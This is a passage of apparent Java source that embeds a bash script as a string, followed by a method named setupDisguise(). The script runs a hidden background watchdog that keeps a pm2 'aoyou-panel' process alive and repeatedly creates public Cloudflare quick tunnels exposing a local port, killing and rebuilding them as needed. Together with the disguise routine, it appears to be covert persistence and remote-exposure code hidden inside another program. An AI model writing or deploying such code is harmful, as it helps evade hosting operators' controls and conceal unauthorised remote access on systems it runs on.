\"$WORK_DIR/tunnel.log\" 2>&1 &\n                NEW_PID=$!\n                sleep 5\n                if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n                NEW_URL=\"\"\n                for j in $(seq 1 20); do\n                    NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n                    if [ -n \"$NEW_URL\" ]; then break; fi\n                    sleep 1\n                done\n                if [ -n \"$NEW_URL\" ]; then\n                    sleep 3\n                    V=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n                    if [ -n \"$V\" ] && [ \"$V\" != \"000\" ] && [ \"$V\" != \"502\" ]; then\n                        echo \"$NEW_URL\" > \"$WORK_DIR/.tunnel_url\"\n                        echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.tunnel_url\"\n                        echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.tunnel_url\"\n                        REBUILT=true\n                    else\n                        sleep 5\n                        V2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n                        if [ -n \"$V2\" ] && [ \"$V2\" != \"000\" ]; then\n                            echo \"$NEW_URL\" > \"$WORK_DIR/.tunnel_url\"\n                            echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.tunnel_url\"\n                            echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.tunnel_url\"\n                            REBUILT=true\n                        else\n                            kill $NEW_PID 2>/dev/null\n                        fi\n                    fi\n                else\n                    kill $NEW_PID 2>/dev/null\n                fi\n            done\n        fi\n    fi\nfi\n\n(while true; do\n    if ! pm2 pid aoyou-panel &>/dev/null || [ \"$(pm2 pid aoyou-panel 2>/dev/null)\" = \"0\" ]; then\n        export SERVER_PORT=$PORT; export PORT=$PORT\n        pm2 restart aoyou-panel &>/dev/null || pm2 start index.js --name aoyou-panel &>/dev/null\n        for i in $(seq 1 20); do\n            if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n            sleep 1\n        done\n    fi\n    \n    NEED_REBUILD=false\n    SAVED_CF_PID=$(grep 'CF_PID=' \"$WORK_DIR/.tunnel_url\" 2>/dev/null | cut -d= -f2)\n    SAVED_PROTO=$(grep 'PROTOCOL=' \"$WORK_DIR/.tunnel_url\" 2>/dev/null | cut -d= -f2)\n    SAVED_PROTO=${SAVED_PROTO:-quic}\n    SAVED_URL=$(head -n1 \"$WORK_DIR/.tunnel_url\" 2>/dev/null)\n    \n    if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then\n        NEED_REBUILD=true\n    fi\n    \n    if [ \"$NEED_REBUILD\" = \"false\" ] && [ -n \"$SAVED_URL\" ]; then\n        HC=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n        if [ -z \"$HC\" ] || [ \"$HC\" = \"000\" ]; then\n            sleep 5\n            HC2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n            if [ -z \"$HC2\" ] || [ \"$HC2\" = \"000\" ]; then\n                NEED_REBUILD=true\n            fi\n        fi\n    fi\n    \n    if [ \"$NEED_REBUILD\" = \"true\" ]; then\n        [ -n \"$SAVED_CF_PID\" ] && kill $SAVED_CF_PID 2>/dev/null\n        pkill -f 'cloudflared.*tunnel' 2>/dev/null\n        sleep 2\n        rm -f \"$WORK_DIR/tunnel.log\"\n        \n        for RPROTO in $SAVED_PROTO quic http2 auto; do\n            rm -f \"$WORK_DIR/tunnel.log\"\n            $CF_BIN tunnel --url http://127.0.0.1:$PORT --no-autoupdate --protocol $RPROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n            NEW_PID=$!\n            sleep 5\n            if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n            \n            NEW_URL=\"\"\n            for j in $(seq 1 20); do\n                NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n                if [ -n \"$NEW_URL\" ]; then break; fi\n                sleep 1\n            done\n            \n            if [ -z \"$NEW_URL\" ]; then\n                kill $NEW_PID 2>/dev/null\n                continue\n            fi\n            \n            echo \"$NEW_URL\" > \"$WORK_DIR/.tunnel_url\"\n            echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.tunnel_url\"\n            echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.tunnel_url\"\n            break\n        done\n    fi\n    \n    sleep 15\ndone) &\n";
     }
 
     private void setupDisguise() {
